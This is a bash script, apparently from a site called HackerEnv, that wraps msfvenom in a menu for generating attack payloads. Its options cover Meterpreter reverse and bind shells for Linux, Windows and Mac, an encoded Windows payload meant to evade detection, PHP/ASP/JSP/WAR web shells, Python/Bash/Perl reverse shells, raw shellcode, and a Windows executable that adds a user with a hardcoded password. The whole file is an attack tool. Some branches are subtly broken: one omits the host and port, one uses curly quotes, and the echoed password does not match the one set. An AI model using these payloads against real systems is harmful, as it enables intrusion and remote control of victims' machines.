#!/bin/bash
BLUE='\e[1;34m'
RED='\e[1;91m'
GREEN='\e[32m'
BOLD='\e[1m'
resetStyle='\e[0m'

cat <<'EOF'
 _    _               _                ______              
| |  | |             | |              |  ____|             
| |__| |  __ _   ___ | | __ ___  _ __ | |__    _ __ __   __
|  __  | / _` | / __|| |/ // _ \| '__||  __|  | '_ \\ \ / /
| |  | || (_| || (__ |   <|  __/| |   | |____ | | | |\ V / 
|_|  |_| \__,_| \___||_|\_\\___||_|   |______||_| |_| \_/  

EOF

echo ""
echo -e "${RED}+ -- --=[Almy by @saleh_979"
echo -e "${RED}+ -- --=[https://hackerEnv.com${resetStyle}"
echo ""

read -p "What is your ip Address? " MY_IP 
read -p "What is your port? " MY_PORT 
function Binaries(){
	echo "======== Binaries Payloads ==========="
	echo "[1] Linux Meterpreter Reverse Shell"
	echo "[2] Linux Bind Meterpreter Shell"
	echo "[3] Linux Bind Shell"
	echo "[4] Windows Meterpreter Reverse TCP Shell"
	echo "[5] Windows Reverse TCP Shell"
	echo "[6] Windows Encoded Meterpreter Windows Reverse Shell"
	echo "[7] Mac Reverse Shell"
	echo "[8] Mac Bind Shell"
	read -p "choose a Payload " bin_shell
	if [[ $bin_shell == 1 ]]; then
		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f elf > shell.elf

	elif [[ $bin_shell == 2 ]]; then
	 	msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=$MY_IP LPORT=$MY_PORT -f elf > bind.elf

	elif [[ $bin_shell == 3 ]]; then
		msfvenom -p generic/shell_bind_tcp RHOST=$MY_IP LPORT=$MY_PORT -f elf > term.elf

	elif [[ $bin_shell == 4 ]]; then
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f exe > shell.exe	
	elif [[ $bin_shell == 5 ]]; then
		msfvenom -p windows/shell/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f exe > shell.exe

	elif [[ $bin_shell == 6 ]]; then
		msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe

	elif [[ $bin_shell == 7 ]]; then
		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f macho > shell.macho

	elif [[ $bin_shell == 8 ]]; then
		msfvenom -p osx/x86/shell_bind_tcp RHOST=$MY_IP LPORT=$MY_PORT -f macho > bind.macho
	fi

}

function Web(){
	echo "=========  Web Payloads ========="
	echo "[1] PHP Meterpreter Reverse TCP"
	echo "[2] ASP Meterpreter Reverse TCP"
	echo "[3] JSP Java Meterpreter Reverse TCP"
	echo "[4] WAR"
	echo "[5] Python Reverse Shell"
	echo "[6] Bash Unix Reverse Shell"
	echo "[7] Perl Unix Reverse shell"
	read -p "choose a Payload " Web
	if [[ $Web == 1 ]]; then
		msfvenom -p php/meterpreter_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f raw | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php
	elif [[ $Web == 2 ]]; then
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f asp > shell.asp
	elif [[ $Web == 3 ]]; then
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f raw > shell.jsp
	elif [[ $Web == 4 ]]; then
		msfvenom -p java/jsp_shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f war > shell.war
	elif [[ $Web == 5 ]]; then
		msfvenom -p cmd/unix/reverse_python LHOST=$MY_IP LPORT=$MY_PORT -f raw > shell.py
	elif [[ $Web == 6 ]]; then
		msfvenom -p cmd/unix/reverse_bash LHOST=$MY_IP LPORT=$MY_PORT -f raw > shell.sh
	elif [[ $Web == 7 ]]; then
		msfvenom -p cmd/unix/reverse_perl LHOST=$MY_IP LPORT=$MY_PORT -f raw > shell.pl
	fi
}

function Shellcode(){
	echo "========== echo Shellcode =========="
	echo "[1] Windows Meterpreter Reverse TCP Shellcode"
	echo "[2] Linux Meterpreter Reverse TCP Shellcode"
	echo "[3] Mac Reverse TCP Shellcode"
	echo "[4] Create User"
	read -p "choose a Payload " Shellcode
	if [[ $Shellcode == 1 ]]; then
		msfvenom -p windows/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f c
	elif [[ $Shellcode == 2 ]]; then
		msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f c
	elif [[ $Shellcode == 3 ]]; then
		msfvenom -p osx/x86/shell_reverse_tcp LHOST=$MY_IP LPORT=$MY_PORT -f c 
	elif [[ $Shellcode == 4 ]]; then
		msfvenom -p windows/adduser USER=Hackerenv PASS='Happyhacking123!' -f exe > adduser.exe && echo "USER=Hackerenv PASS='Happyhack123!'"
	fi

}

echo -e "chose one of the categories\n [1] Binaries Payloads\n [2] Web Payloads\n [3] echo Shellcode " 
read -p "What category you want? " category
if (($category == 1))
then
	 Binaries
elif (($category == 2))
then
	Web
elif (($category == 3))
then
	Shellcode
fi

	
